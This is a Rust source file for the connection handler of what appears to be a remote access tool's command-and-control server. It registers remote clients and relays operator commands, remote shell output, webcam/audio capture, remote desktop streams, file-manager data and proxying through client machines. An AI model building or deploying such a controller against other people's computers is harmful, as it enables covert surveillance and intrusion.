//! Client connection handler.
//!
//! Manages the lifecycle of a single client connection.

use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncWrite, AsyncReadExt, AsyncWriteExt, ReadHalf, WriteHalf};
use tokio::sync::{mpsc, watch};
use tokio::time::interval;

use crate::client::{ClientRegistry, ClientStatus, FilterResult, ProxyMessage, SessionId};
use crate::logging::SharedLogStore;
use crate::protocol::{
    read_client_message, send_server_message, ClientMessageType, CommandMessage,
    CommandResponseMessage, DisconnectMessage, InfoUpdateMessage, BinaryMediaFrame,
    PingMessage, PongMessage, ProtocolError, RegisterMessage, ServerMessageType,
    ShellExitMessage, ShellOutputMessage, WelcomeMessage, PROTOCOL_VERSION,
    ProxyConnectMessage, ProxyDataMessage, ProxyCloseMessage, TileFrame, ScreenTile,
    H264Frame, ProxyTarget, MAX_MESSAGE_SIZE,
};
use crate::settings::SharedSettings;
use crate::websocket::{self, detect_websocket_upgrade, accept_websocket, UpgradeResult, Opcode};

use serde::Serialize;

/// Media frame payload for UI (raw JPEG bytes - no base64 overhead)
#[derive(Debug, Clone, Serialize)]
pub struct MediaFramePayload {
    pub timestamp_ms: u64,
    pub width: u16,
    pub height: u16,
    /// Raw JPEG bytes - serialized as number array for JS Uint8Array
    pub jpeg_data: Vec<u8>,
}

impl From<BinaryMediaFrame> for MediaFramePayload {
    fn from(frame: BinaryMediaFrame) -> Self {
        MediaFramePayload {
            timestamp_ms: frame.timestamp_ms,
            width: frame.width,
            height: frame.height,
            jpeg_data: frame.jpeg_data,
        }
    }
}

/// Tile payload for UI (serializable screen tile)
#[derive(Debug, Clone, Serialize)]
pub struct TilePayload {
    pub x: u16,
    pub y: u16,
    pub width: u16,
    pub height: u16,
    /// Raw JPEG bytes - serialized as number array for JS Uint8Array
    #[serde(rename = "jpegData")]
    pub jpeg_data: Vec<u8>,
}

impl From<ScreenTile> for TilePayload {
    fn from(tile: ScreenTile) -> Self {
        TilePayload {
            x: tile.x,
            y: tile.y,
            width: tile.width,
            height: tile.height,
            jpeg_data: tile.jpeg_data,
        }
    }
}

/// Tile-based remote desktop frame payload for UI
#[derive(Debug, Clone, Serialize)]
pub struct TileFramePayload {
    pub width: u16,
    pub height: u16,
    #[serde(rename = "isKeyframe")]
    pub is_keyframe: bool,
    pub tiles: Vec<TilePayload>,
}

/// H.264 remote desktop frame payload for UI
#[derive(Debug, Clone, Serialize)]
pub struct H264FramePayload {
    pub width: u16,
    pub height: u16,
    #[serde(rename = "isKeyframe")]
    pub is_keyframe: bool,
    #[serde(rename = "timestampMs")]
    pub timestamp_ms: u64,
    /// H.264 NAL unit data (Annex B format)
    pub data: Vec<u8>,
}

impl From<H264Frame> for H264FramePayload {
    fn from(frame: H264Frame) -> Self {
        H264FramePayload {
            width: frame.width,
            height: frame.height,
            is_keyframe: frame.is_keyframe,
            timestamp_ms: frame.timestamp_ms,
            data: frame.data,
        }
    }
}

/// Shell event emitted to frontend
#[derive(Debug, Clone, Serialize)]
#[serde(tag = "type", content = "payload")]
pub enum ShellEvent {
    /// Shell output data
    Output { uid: String, data: String },
    /// Shell session exited
    Exit { uid: String, exit_code: Option<i32> },
    /// Command response received
    Response { uid: String, response: CommandResponseMessage },
    /// Media frame received (webcam/audio)
    MediaFrame { uid: String, frame: MediaFramePayload },
    /// Remote desktop frame received (tile-based JPEG)
    RemoteDesktopTileFrame { uid: String, frame: TileFramePayload },
    /// Remote desktop H.264 frame received
    RemoteDesktopH264Frame { uid: String, frame: H264FramePayload },
    /// Proxy connection result from client
    ProxyConnectResult { uid: String, payload: Vec<u8> },
    /// Proxy data from client (target -> operator)
    ProxyData { uid: String, payload: Vec<u8> },
    /// Proxy connection closed by client
    ProxyClosed { uid: String, payload: Vec<u8> },
}

/// File manager event emitted to frontend
#[derive(Debug, Clone, Serialize)]
#[serde(tag = "type", content = "payload")]
pub enum FileManagerEvent {
    /// Command response (directory listing, file data, etc.)
    Response { uid: String, command_id: String, response: CommandResponseMessage },
}

/// Shared channel for shell events
pub type ShellEventSender = mpsc::Sender<ShellEvent>;

// ============================================================================
// WebSocket-aware Protocol Functions
// ============================================================================

/// Read a client message, with optional WebSocket framing
async fn read_client_message_ws<R: AsyncRead + Unpin>(
    reader: &mut R,
    websocket_mode: bool,
    prepended: &mut Option<Vec<u8>>,
) -> Result<(ClientMessageType, Vec<u8>), ProtocolError> {
    if websocket_mode {
        // Read WebSocket frame
        let (opcode, payload) = websocket::read_frame(reader).await
            .map_err(|e| ProtocolError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())))?;

        // Handle control frames
        match opcode {
            Opcode::Close => return Err(ProtocolError::ConnectionClosed),
            Opcode::Ping => {
                // Just ignore pings (we should send pong but we're the server)
                // Read next frame
                return Box::pin(read_client_message_ws(reader, websocket_mode, prepended)).await;
            }
            Opcode::Pong => {
                // Ignore pongs
                return Box::pin(read_client_message_ws(reader, websocket_mode, prepended)).await;
            }
            Opcode::Binary | Opcode::Text => {
                // Parse our protocol message from the payload
                if payload.len() < 5 {
                    return Err(ProtocolError::Io(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        "WebSocket payload too small for protocol message",
                    )));
                }

                // Our protocol: [4 bytes length][1 byte type][payload]
                let len = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
                if len as usize != payload.len() - 4 {
                    return Err(ProtocolError::Io(std::io::Error::new(
                        std::io::ErrorKind::InvalidData,
                        format!("Message length mismatch: header={}, actual={}", len, payload.len() - 4),
                    )));
                }

                let msg_type = ClientMessageType::try_from(payload[4])?;
                let data = payload[5..].to_vec();
                return Ok((msg_type, data));
            }
            Opcode::Continuation => {
                return Err(ProtocolError::Io(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "Unexpected continuation frame",
                )));
            }
        }
    } else {
        // Check if we have prepended bytes from WebSocket detection
        if let Some(prepend) = prepended.take() {
            // Create a chain of prepended bytes + reader
            let mut chain = PrependedReader::new(prepend, reader);
            return read_client_message(&mut chain).await;
        }
        // Standard protocol read
        read_client_message(reader).await
    }
}

/// Send a server message, with optional WebSocket framing
async fn send_server_message_ws<W: AsyncWrite + Unpin, T: Serialize>(
    writer: &mut W,
    msg_type: ServerMessageType,
    message: &T,
    websocket_mode: bool,
) -> Result<(), ProtocolError> {
    let json_payload = serde_json::to_vec(message)?;

    if websocket_mode {
        // Build our protocol message: [4 bytes length][1 byte type][json payload]
        let total_len = 1 + json_payload.len() as u32;
        let mut proto_msg = Vec::with_capacity(4 + total_len as usize);
        proto_msg.extend_from_slice(&total_len.to_be_bytes());
        proto_msg.push(msg_type as u8);
        proto_msg.extend_from_slice(&json_payload);

        // Wrap in WebSocket frame
        websocket::write_frame(writer, Opcode::Binary, &proto_msg).await
            .map_err(|e| ProtocolError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())))?;
        writer.flush().await?;
        Ok(())
    } else {
        // Standard protocol send
        send_server_message(writer, msg_type, message).await
    }
}

/// A reader that prepends some bytes before reading from the underlying reader
struct PrependedReader<'a, R> {
    prepend: Vec<u8>,
    offset: usize,
    inner: &'a mut R,
}

impl<'a, R> PrependedReader<'a, R> {
    fn new(prepend: Vec<u8>, inner: &'a mut R) -> Self {
        Self { prepend, offset: 0, inner }
    }
}

impl<'a, R: AsyncRead + Unpin> AsyncRead for PrependedReader<'a, R> {
    fn poll_read(
        mut self: std::pin::Pin<&mut Self>,
        cx: &mut std::task::Context<'_>,
        buf: &mut tokio::io::ReadBuf<'_>,
    ) -> std::task::Poll<std::io::Result<()>> {
        // First, drain prepended bytes
        if self.offset < self.prepend.len() {
            let remaining = &self.prepend[self.offset..];
            let to_copy = std::cmp::min(remaining.len(), buf.remaining());
            buf.put_slice(&remaining[..to_copy]);
            self.offset += to_copy;
            return std::task::Poll::Ready(Ok(()));
        }

        // Then read from inner
        std::pin::Pin::new(&mut *self.inner).poll_read(cx, buf)
    }
}

/// Handle a new client connection
pub async fn handle_client<S>(
    stream: S,
    remote_addr: SocketAddr,
    port: u16,
    registry: Arc<ClientRegistry>,
    shell_event_tx: Option<ShellEventSender>,
    settings: SharedSettings,
    log_store: SharedLogStore,
) where
    S: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    println!("New connection from: {}", remote_addr);

    let (reader, writer) = tokio::io::split(stream);

    match handle_client_inner(reader, writer, remote_addr, port, registry, shell_event_tx, settings, log_store.clone()).await {
        Ok(()) => {
            println!("Client {} disconnected gracefully", remote_addr);
        }
        Err(e) => {
            println!("Client {} error: {}", remote_addr, e);
        }
    }
}

async fn handle_client_inner<R, W>(
    mut reader: ReadHalf<R>,
    mut writer: WriteHalf<W>,
    remote_addr: SocketAddr,
    port: u16,
    registry: Arc<ClientRegistry>,
    shell_event_tx: Option<ShellEventSender>,
    settings: SharedSettings,
    log_store: SharedLogStore,
) -> Result<(), ProtocolError>
where
    R: AsyncRead + Unpin + Send + 'static,
    W: AsyncWrite + Unpin + Send + 'static,
{
    // Detect WebSocket upgrade request
    let (websocket_mode, mut prepended_bytes) = match detect_websocket_upgrade(&mut reader).await {
        Ok(UpgradeResult::WebSocket(key)) => {
            // Accept WebSocket upgrade
            accept_websocket(&mut writer, &key).await
                .map_err(|e| ProtocolError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())))?;
            println!("WebSocket upgrade accepted from {}", remote_addr);
            (true, None)
        }
        Ok(UpgradeResult::NotWebSocket(first_bytes)) => {
            // Not a WebSocket connection - prepend the read bytes
            (false, Some(first_bytes))
        }
        Err(e) => {
            return Err(ProtocolError::Io(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())));
        }
    };

    // Wait for registration message
    let (msg_type, payload) = read_client_message_ws(&mut reader, websocket_mode, &mut prepended_bytes).await?;

    if msg_type != ClientMessageType::Register {
        return Err(ProtocolError::AuthFailed(
            "Expected Register message".to_string(),
        ));
    }

    let register: RegisterMessage = serde_json::from_slice(&payload)?;

    // Validate protocol version
    if register.protocol_version != PROTOCOL_VERSION {
        send_server_message_ws(
            &mut writer,
            ServerMessageType::Disconnect,
            &DisconnectMessage {
                reason: format!(
                    "Protocol version mismatch: client={}, server={}",
                    register.protocol_version, PROTOCOL_VERSION
                ),
            },
            websocket_mode,
        )
        .await?;
        return Err(ProtocolError::VersionMismatch(register.protocol_version));
    }

    // Check filters before registering
    let (filter_dup_uid, filter_dup_ip, filter_dup_lan, max_clients, log_connection_events, timeout_interval) = {
        let s = settings.read();
        (s.filter_dup_uid, s.filter_dup_ip, s.filter_dup_lan, s.max_clients, s.log_connection_events, s.timeout_interval)
    };

    let filter_result = registry.check_filters(
        &register.uid,
        &remote_addr.ip(),
        &register.system_info.local_ips,
        filter_dup_uid,
        filter_dup_ip,
        filter_dup_lan,
        max_clients,
    );

    // Handle filter results
    match filter_result {
        FilterResult::RejectedDuplicateIp => {
            let reason = "Duplicate IP address filtered";
            log_store.warning(format!("Client {} rejected: {}", remote_addr, reason));
            send_server_message_ws(
                &mut writer,
                ServerMessageType::Disconnect,
                &DisconnectMessage { reason: reason.to_string() },
                websocket_mode,
            ).await?;
            return Err(ProtocolError::AuthFailed(reason.to_string()));
        }
        FilterResult::RejectedDuplicateLan => {
            let reason = "Duplicate LAN IP address filtered";
            log_store.warning(format!("Client {} rejected: {}", remote_addr, reason));
            send_server_message_ws(
                &mut writer,
                ServerMessageType::Disconnect,
                &DisconnectMessage { reason: reason.to_string() },
                websocket_mode,
            ).await?;
            return Err(ProtocolError::AuthFailed(reason.to_string()));
        }
        FilterResult::RejectedMaxClients => {
            let reason = format!("Maximum clients ({}) reached", max_clients);
            log_store.warning(format!("Client {} rejected: {}", remote_addr, reason));
            send_server_message_ws(
                &mut writer,
                ServerMessageType::Disconnect,
                &DisconnectMessage { reason: reason.clone() },
                websocket_mode,
            ).await?;
            return Err(ProtocolError::AuthFailed(reason));
        }
        FilterResult::DuplicateUid => {
            // This is handled by disconnecting the old client, not rejecting the new one
            // The register() method handles this automatically
        }
        FilterResult::Allowed => {}
    }

    println!(
        "Client registered: uid={}, build={}, machine={}",
        register.uid, register.build_id, register.system_info.machine_name
    );

    // Log connection if enabled
    if log_connection_events {
        log_store.client_success(&register.uid, &format!(
            "Connected from {} ({})",
            remote_addr.ip(),
            register.system_info.machine_name
        ));
    }

    // Create command channel for this client
    let (command_tx, mut command_rx) = mpsc::channel::<CommandMessage>(32);

    // Create proxy message channel for this client
    let (proxy_tx, mut proxy_rx) = mpsc::channel::<ProxyMessage>(256);

    // Create shutdown signal channel
    let (shutdown_tx, mut shutdown_rx) = watch::channel(false);

    // Register client
    let session_id = registry.register(
        register.uid.clone(),
        register.build_id,
        remote_addr,
        port,
        register.system_info.clone(),
        command_tx,
        shutdown_tx,
    );

    // Store proxy sender in registry so proxy system can send to us
    registry.set_proxy_sender(&register.uid, proxy_tx);

    // Note: Connected event is emitted by registry.register() automatically

    // Get heartbeat interval from settings
    let heartbeat_interval = Duration::from_millis(timeout_interval as u64);

    // Send welcome message
    let welcome = WelcomeMessage {
        protocol_version: PROTOCOL_VERSION,
        server_time: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs(),
        heartbeat_interval_ms: heartbeat_interval.as_millis() as u32,
    };
    send_server_message_ws(&mut writer, ServerMessageType::Welcome, &welcome, websocket_mode).await?;

    // Run the client session
    let result = run_client_session(
        &mut reader,
        &mut writer,
        session_id,
        &register.uid,
        &registry,
        &mut command_rx,
        &mut proxy_rx,
        &mut shutdown_rx,
        shell_event_tx,
        heartbeat_interval,
        settings.clone(),
        websocket_mode,
    )
    .await;

    // Log disconnection if enabled
    if log_connection_events {
        log_store.client_info(&register.uid, "Disconnected");
    }

    // Unregister client - this emits the Disconnected event automatically
    registry.unregister(session_id);

    result
}

async fn run_client_session<R, W>(
    reader: &mut ReadHalf<R>,
    writer: &mut WriteHalf<W>,
    session_id: SessionId,
    uid: &str,
    registry: &Arc<ClientRegistry>,
    command_rx: &mut mpsc::Receiver<CommandMessage>,
    proxy_rx: &mut mpsc::Receiver<ProxyMessage>,
    shutdown_rx: &mut watch::Receiver<bool>,
    shell_event_tx: Option<ShellEventSender>,
    heartbeat_interval: Duration,
    _settings: SharedSettings,
    websocket_mode: bool,
) -> Result<(), ProtocolError>
where
    R: AsyncRead + Unpin,
    W: AsyncWrite + Unpin,
{
    let mut heartbeat_timer = interval(heartbeat_interval);
    let mut ping_seq: u32 = 0;
    let mut last_ping_sent: Option<Instant> = None;
    let mut prepended: Option<Vec<u8>> = None; // For non-WS mode with prepended bytes

    loop {
        tokio::select! {
            // Shutdown signal from registry (e.g., port stopped)
            _ = shutdown_rx.changed() => {
                if *shutdown_rx.borrow() {
                    println!("Shutdown signal received for session {}, disconnecting", session_id);
                    // Send disconnect message to client
                    let disconnect = DisconnectMessage {
                        reason: "Server closed connection".to_string(),
                    };
                    let _ = send_server_message_ws(writer, ServerMessageType::Disconnect, &disconnect, websocket_mode).await;
                    return Ok(());
                }
            }

            // Heartbeat tick
            _ = heartbeat_timer.tick() => {
                ping_seq = ping_seq.wrapping_add(1);
                let ping = PingMessage {
                    timestamp: std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_millis() as u64,
                    seq: ping_seq,
                };
                last_ping_sent = Some(Instant::now());
                send_server_message_ws(writer, ServerMessageType::Ping, &ping, websocket_mode).await?;
            }

            // Command from server to send to client
            Some(cmd) = command_rx.recv() => {
                send_server_message_ws(writer, ServerMessageType::Command, &cmd, websocket_mode).await?;
            }

            // Proxy message to send to client
            Some(proxy_msg) = proxy_rx.recv() => {
                match proxy_msg {
                    ProxyMessage::Connect { conn_id, host, port } => {
                        // Legacy TCP connect - convert to unified format
                        let msg = ProxyConnectMessage {
                            conn_id,
                            target: ProxyTarget::Tcp { host, port },
                        };
                        send_server_message_ws(writer, ServerMessageType::ProxyConnect, &msg, websocket_mode).await?;
                    }
                    ProxyMessage::ConnectTarget { conn_id, target } => {
                        // Unified connect with target type
                        let msg = ProxyConnectMessage { conn_id, target };
                        send_server_message_ws(writer, ServerMessageType::ProxyConnect, &msg, websocket_mode).await?;
                    }
                    ProxyMessage::Data { conn_id, data } => {
                        // Encode as base64 for JSON transport
                        let data_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &data);
                        let msg = ProxyDataMessage { conn_id, data: data_b64 };
                        send_server_message_ws(writer, ServerMessageType::ProxyData, &msg, websocket_mode).await?;
                    }
                    ProxyMessage::Close { conn_id } => {
                        let msg = ProxyCloseMessage { conn_id };
                        send_server_message_ws(writer, ServerMessageType::ProxyClose, &msg, websocket_mode).await?;
                    }
                }
            }

            // Message from client
            msg_result = read_client_message_ws(reader, websocket_mode, &mut prepended) => {
                let (msg_type, payload) = msg_result?;

                match msg_type {
                    ClientMessageType::Pong => {
                        let _pong: PongMessage = serde_json::from_slice(&payload)?;

                        // Calculate ping RTT
                        if let Some(sent_at) = last_ping_sent.take() {
                            let ping_ms = sent_at.elapsed().as_millis() as u32;
                            registry.update_ping(session_id, ping_ms);
                        }
                        registry.update_last_seen(session_id);
                    }

                    ClientMessageType::InfoUpdate => {
                        let update: InfoUpdateMessage = serde_json::from_slice(&payload)?;
                        registry.update_system_info(session_id, update.system_info);
                    }

                    ClientMessageType::CommandResponse => {
                        let response: CommandResponseMessage = serde_json::from_slice(&payload)?;
                        registry.update_last_seen(session_id);
                        println!("Received command response from session {}: id={}", session_id, response.id);

                        // Emit shell event for command responses
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::Response {
                                uid: uid.to_string(),
                                response,
                            });
                        }
                    }

                    ClientMessageType::ShellOutput => {
                        let output: ShellOutputMessage = serde_json::from_slice(&payload)?;
                        registry.update_last_seen(session_id);

                        // Emit shell output event
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::Output {
                                uid: uid.to_string(),
                                data: output.data,
                            });
                        }
                    }

                    ClientMessageType::ShellExit => {
                        let exit_msg: ShellExitMessage = serde_json::from_slice(&payload)?;
                        registry.update_last_seen(session_id);
                        println!("Shell exited for session {}: code={:?}", session_id, exit_msg.exit_code);

                        // Emit shell exit event
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::Exit {
                                uid: uid.to_string(),
                                exit_code: exit_msg.exit_code,
                            });
                        }
                    }

                    ClientMessageType::MediaFrame => {
                        // Parse binary frame (much more efficient than JSON!)
                        match BinaryMediaFrame::from_bytes(&payload) {
                            Some(frame) => {
                                registry.update_last_seen(session_id);

                                // Convert to UI-friendly payload and emit
                                if let Some(ref tx) = shell_event_tx {
                                    let _ = tx.try_send(ShellEvent::MediaFrame {
                                        uid: uid.to_string(),
                                        frame: frame.into(),
                                    });
                                }
                            }
                            None => {
                                eprintln!("Failed to parse binary media frame");
                            }
                        }
                    }

                    ClientMessageType::RemoteDesktopFrame => {
                        // Parse tile-based frame for remote desktop
                        match TileFrame::from_bytes(&payload) {
                            Some(frame) => {
                                registry.update_last_seen(session_id);

                                // Convert to UI-friendly payload and emit
                                if let Some(ref tx) = shell_event_tx {
                                    let tile_payload = TileFramePayload {
                                        width: frame.width,
                                        height: frame.height,
                                        is_keyframe: frame.is_keyframe,
                                        tiles: frame.tiles.into_iter().map(|t| t.into()).collect(),
                                    };
                                    let _ = tx.try_send(ShellEvent::RemoteDesktopTileFrame {
                                        uid: uid.to_string(),
                                        frame: tile_payload,
                                    });
                                }
                            }
                            None => {
                                eprintln!("Failed to parse remote desktop tile frame");
                            }
                        }
                    }

                    ClientMessageType::RemoteDesktopH264Frame => {
                        // Parse H.264 frame for remote desktop
                        match H264Frame::from_bytes(&payload) {
                            Some(frame) => {
                                registry.update_last_seen(session_id);

                                // Convert to UI-friendly payload and emit
                                if let Some(ref tx) = shell_event_tx {
                                    let _ = tx.try_send(ShellEvent::RemoteDesktopH264Frame {
                                        uid: uid.to_string(),
                                        frame: frame.into(),
                                    });
                                }
                            }
                            None => {
                                eprintln!("Failed to parse remote desktop H.264 frame");
                            }
                        }
                    }

                    ClientMessageType::Goodbye => {
                        println!("Client {} sent goodbye", session_id);
                        return Ok(());
                    }

                    ClientMessageType::Register => {
                        // Shouldn't receive another register message
                        return Err(ProtocolError::AuthFailed(
                            "Unexpected Register message".to_string(),
                        ));
                    }

                    ClientMessageType::ProxyConnectResult => {
                        // Forward to proxy manager via shell event channel
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::ProxyConnectResult {
                                uid: uid.to_string(),
                                payload,
                            });
                        }
                    }

                    ClientMessageType::ProxyData => {
                        // Forward to proxy manager via shell event channel
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::ProxyData {
                                uid: uid.to_string(),
                                payload,
                            });
                        }
                    }

                    ClientMessageType::ProxyClosed => {
                        // Forward to proxy manager via shell event channel
                        if let Some(ref tx) = shell_event_tx {
                            let _ = tx.try_send(ShellEvent::ProxyClosed {
                                uid: uid.to_string(),
                                payload,
                            });
                        }
                    }
                }
            }
        }
    }
}

/// Background task to check for timed-out clients
pub async fn timeout_checker(registry: Arc<ClientRegistry>, log_store: SharedLogStore, settings: SharedSettings) {
    let mut timer = interval(Duration::from_secs(10));

    loop {
        timer.tick().await;

        // Get timeout values from settings
        let (keepalive_timeout, timeout_interval) = {
            let s = settings.read();
            (s.keepalive_timeout, s.timeout_interval)
        };

        // Idle timeout: timeout_interval (when to mark as idle)
        // Disconnect timeout: keepalive_timeout (when to actually disconnect)
        let idle_timeout = Duration::from_millis(timeout_interval as u64);
        let disconnect_timeout = Duration::from_millis(keepalive_timeout as u64);

        let to_disconnect = registry.check_timeouts(idle_timeout, disconnect_timeout);

        for session_id in to_disconnect {
            // Get client UID for logging before unregistering
            if let Some(uid) = registry.get_uid_by_session(session_id) {
                log_store.client_warning(&uid, "Client timed out, disconnecting");
            }
            println!("Client {} timed out, disconnecting", session_id);
            registry.unregister(session_id);
        }
    }
}
